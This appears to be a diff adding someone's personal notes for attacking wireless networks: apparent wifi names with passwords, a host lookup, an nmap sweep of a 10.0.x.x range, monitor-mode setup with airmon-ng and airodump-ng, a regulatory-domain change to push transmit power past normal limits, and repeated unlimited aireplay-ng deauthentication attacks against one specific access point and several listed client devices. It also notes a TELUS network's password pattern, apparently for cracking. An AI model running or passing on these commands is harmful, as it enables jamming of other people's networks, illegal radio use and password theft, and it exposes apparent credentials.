@@ -1,0 +1,54 @@
+FBI_VAN-78MAC
+metroidprime2
+
+RECKLESS_MXANALOG
+38:3F:B3:E5:6C:C4
+*#95DeKaBrA
+
+$ nslookup chalister.ca
+## 3.84.103.243
+
+$ nmap -v -A -iL <listofhosts/networks> 10.0.<0-255>.<1-254>
+
+$ airmon-ng check wlan0
+$ airmon-ng check kill
+$ airmon-ng start wlan0
+$ airodump-ng wlan0
+$ airodump-ng --bssid --essid
+
+$ systemctl start NetworkManager $$ wpa_supplicant
+
+TELUS1702
+10:78:5B:E4:90:12
+Ch 1
+Freq: 2412 5411
+IEEE 802.11b+
+CCK encoding
+WPA+PSK
+WPA+AES-CCM
+
+10 digits
+numbers and lowercase (% and @)
+
+iw reg set BO
+iwconfig wlan0 txpower 30
+
+ifconfig wlan0 down
+iw reg set BO
+ifconfig wlan0 up
+iwconfig wlan0 channel 13
+iwconfig wlan0 txpower 30
+
+airodump-ng --channel 6  --output-format pcap -w /root/airodumps/0722 
+aireplay-ng -a BC:2E:48:11:EC:E7 --deauth 0 wlan1mon
+aireplay-ng -a BC:2E:48:11:EC:E7 --deauth 0  -c A8:66:7F:03:BF:C2 wlan1mon
+aireplay-ng --deauth 0 -c 00:9D:6B:18:8C:6C wlan1mon
+aireplay-ng -a BC:2E:48:11:EC:E7 --deauth 0  -c 34:79:16:FF:EF:F5 wlan1mon
+aireplay-ng -a BC:2E:48:11:EC:E7 --deauth 0  -c 00:9D:6B:18:8C:6C wlan1mon
+38:9D:92:24:9D:48
+00:9D:6B:18:8C:6C
+A8:66:7F:03:BF:C2
+FC:18:3C:86:D0:22
+EE:48:61:98:84:E8
+A2:40:58:17:48:6D
+A8:66:7F:03:BF:C2
